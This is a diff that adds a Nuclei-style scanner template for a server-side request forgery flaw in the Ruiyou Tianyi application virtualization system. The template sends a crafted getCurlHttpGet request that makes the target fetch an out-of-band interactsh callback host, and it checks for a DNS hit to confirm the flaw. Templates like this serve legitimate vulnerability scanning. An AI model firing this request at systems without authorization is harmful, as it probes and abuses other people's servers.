@@ -1,0 +1,26 @@
+id: poc-yaml-gwt-system-getcurlhttpget-ssrf
+info:
+  name: 瑞友天翼应用虚拟化系统 getCurlHttpGet SSRF漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: DNSLOG,ssrf
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /hmrao.php?s=/Admin/getCurlHttpGet&URL=https://{{reverse}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: body
+        words:
+          - ""
